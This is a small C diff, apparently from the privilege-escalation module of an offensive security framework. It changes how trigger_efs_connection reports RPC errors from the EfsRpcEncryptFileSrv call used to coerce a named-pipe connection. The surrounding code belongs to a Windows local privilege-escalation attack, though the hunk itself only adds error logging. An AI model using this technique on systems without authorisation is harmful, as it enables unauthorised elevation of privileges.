@@ -137,8 +137,14 @@ DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
 		if (hr == ERROR_BAD_NETPATH) {
 			dprintf("[ELEVATE] trigger_efs_connection: Success");
 		} else {
-			dwResult = hr;
-			dprintf("[ELEVATE] trigger_efs_connection: Did not receive expected output. Attack might have failed.");
+			unsigned char RpcError[DCE_C_ERROR_STRING_LEN];
+			if (DceErrorInqTextA(hr, RpcError) == RPC_S_OK) {
+				dprintf("[ELEVATE] trigger_efs_connection - RPC error in EfsRpcEncryptFileSrv: 0x%08x - %s", hr, RpcError);
+			}
+			else {
+				dprintf("[ELEVATE] trigger_efs_connection - RPC error in EfsRpcEncryptFileSrv: 0x%08x", hr);
+			}
+			dwResult = RPC_S_CALL_FAILED;
 		}
 
 	} while (0);
